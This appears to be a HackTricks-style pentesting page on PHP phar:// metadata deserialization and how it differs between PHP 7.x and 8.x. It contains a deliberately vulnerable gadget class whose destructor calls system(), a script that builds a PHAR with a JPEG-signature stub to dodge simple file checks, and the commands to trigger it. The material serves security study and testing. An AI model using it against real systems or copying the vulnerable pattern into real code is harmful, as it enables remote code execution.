# `phar://` Deserialization

{{#include ../../banners/hacktricks-training.md}}

PHAR (PHP Archive) files can store serialized PHP values as archive metadata. Before PHP 8.0, opening a PHAR through the stream wrapper could automatically deserialize that metadata; starting with PHP 8.0, metadata deserialization is deferred until `Phar::getMetadata()` is called.<sup>[[1]](#references)</sup>

Consequently, the classic `phar://` object-injection technique applies primarily to PHP 7.x and older applications that pass attacker-controlled paths to filesystem functions such as `file_exists()`, `filesize()`, or `file_get_contents()`. On PHP 8.x, look instead for explicit calls to `Phar::getMetadata()` on an untrusted archive; PHP warns that doing so can execute code through object deserialization.<sup>[[1]](#references)[[2]](#references)</sup>

Exploitation also requires a usable gadget class in the application. The following deliberately vulnerable example has a destructor that executes the value stored in `$data`:<sup>[[3]](#references)</sup>

```php:vuln.php
<?php
class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}

	function __destruct() {
		system($this->data);
	}
}

filesize("phar://test.phar"); // Attacker-controlled path on affected PHP versions
```

The following script creates a PHAR whose metadata contains that object:

```php:create_phar.php
<?php

class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}

	function __destruct() {
		system($this->data);
	}
}

// Create a new PHAR.
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// Store the gadget object as metadata.
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

The stub starts with JPEG signature bytes. This may evade a simplistic signature check, but it does not make the archive a fully valid image and will not bypass robust server-side validation.<sup>[[3]](#references)</sup>

Create `test.phar` with:

```bash
php --define phar.readonly=0 create_phar.php
```

On an affected PHP version, invoking the vulnerable code causes the metadata object to be reconstructed and its destructor to run:

```bash
php vuln.php
```

## References

- [1] [PHP manual - Phar class and PHP 8 metadata-deserialization change](https://www.php.net/manual/en/class.phar.php)
- [2] [PHP manual - Phar::getMetadata](https://www.php.net/manual/en/phar.getmetadata.php)
- [3] [RIPS Technologies - PHP object injection via `phar://` metadata](https://blog.ripstech.com/2018/new-php-exploitation-technique/)

{{#include ../../banners/hacktricks-training.md}}
